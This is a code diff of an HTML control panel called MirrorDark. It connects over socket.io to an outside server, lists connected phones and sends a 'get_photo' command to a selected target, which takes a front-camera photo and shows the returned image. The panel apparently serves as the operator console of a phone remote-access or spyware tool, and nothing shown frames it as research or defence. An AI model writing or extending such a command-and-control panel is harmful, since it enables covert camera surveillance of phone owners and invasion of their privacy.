@@ -1,50 +1,110 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <title>MirrorDark - Panel de Control</title>
+  <head>
+    <meta charset="UTF-8" />
+    <title>MirrorDark - Panel de Control Multi-Dispositivo</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding: 40px; }
-        button { padding: 12px 24px; font-size: 16px; margin: 10px; cursor: pointer; background: #ff4757; color: white; border: none; border-radius: 5px; }
-        button:hover { background: #ff6b81; }
-        #screen-view { max-width: 400px; margin-top: 20px; border: 2px solid #333; border-radius: 8px; }
+      body {
+        font-family: Arial, sans-serif;
+        background: #121212;
+        color: #fff;
+        text-align: center;
+        padding: 40px;
+      }
+      select, button {
+        padding: 12px 18px;
+        font-size: 16px;
+        margin: 10px;
+        cursor: pointer;
+        border-radius: 5px;
+        border: none;
+      }
+      button {
+        background: #ff4757;
+        color: white;
+      }
+      button:hover {
+        background: #ff6b81;
+      }
+      select {
+        background: #333;
+        color: white;
+      }
+      #screen-view {
+        max-width: 400px;
+        margin-top: 20px;
+        border: 2px solid #333;
+        border-radius: 8px;
+      }
     </style>
-</head>
-<body>
-
+  </head>
+  <body>
     <h1>MirrorDark - Panel de Control</h1>
-    <p>Estado del servidor: <span id="status" style="color: yellow;">Conectando...</span></p>
+    <p>Estado del servidor: <span id="status" style="color: yellow">Conectando...</span></p>
 
     <div>
-        <button onclick="sendCommand('get_photo')">Tomar Foto (Cámara Frontal)</button>
+      <label for="deviceSelect">Selecciona el dispositivo:</label><br>
+      <select id="deviceSelect">
+        <option value="">Buscando dispositivos...</option>
+      </select>
     </div>
 
     <div>
-        <h3>Vista previa:</h3>
-        <img id="screen-view" src="" alt="Esperando respuesta del celular..." />
+      <button onclick="sendCommand('get_photo')">Tomar Foto (Cámara Frontal)</button>
+    </div>
+
+    <div>
+      <h3>Vista previa:</h3>
+      <img id="screen-view" src="" alt="Esperando respuesta del celular..." />
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
-        const statusSpan = document.getElementById('status');
-        const screenView = document.getElementById('screen-view');
+      const socket = io("https://mirrowdark.onrender.com");
+      const statusSpan = document.getElementById("status");
+      const screenView = document.getElementById("screen-view");
+      const deviceSelect = document.getElementById("deviceSelect");
 
-        socket.on('connect', () => {
-            statusSpan.textContent = 'Conectado';
-            statusSpan.style.color = 'lightgreen';
-        });
+      socket.on("connect", () => {
+        statusSpan.textContent = "Conectado";
+        statusSpan.style.color = "lightgreen";
+        socket.emit("get_devices");
+      });
 
-        function sendCommand(action) {
-            console.log("Enviando orden:", action);
-            socket.emit('command_to_phone', { action: action });
+      // Actualizar la lista de celulares conectados en tiempo real
+      socket.on("update_device_list", (devices) => {
+        deviceSelect.innerHTML = "";
+        if (devices.length === 0) {
+          const opt = document.createElement("option");
+          opt.value = "";
+          opt.textContent = "No hay celulares conectados";
+          deviceSelect.appendChild(opt);
+          return;
         }
 
-        socket.on('phone_response', (data) => {
-            if (data.type === 'photo') {
-                screenView.src = `data:image/jpeg;base64,${data.image}`;
-            }
+        devices.forEach(dev => {
+          const opt = document.createElement("option");
+          opt.value = dev.id;
+          opt.textContent = dev.name;
+          deviceSelect.appendChild(opt);
         });
+      });
+
+      function sendCommand(action) {
+        const selectedId = deviceSelect.value;
+        if (!selectedId) {
+          alert("Por favor selecciona un celular de la lista.");
+          return;
+        }
+        console.log("Enviando orden:", action, "a target:", selectedId);
+        socket.emit("command_to_phone", { action: action, targetId: selectedId });
+      }
+
+      socket.on("phone_response", (data) => {
+        if (data.type === "photo") {
+          screenView.src = `data:image/jpeg;base64,${data.image}`;
+        }
+      });
     </script>
-</body>
+  </body>
 </html>
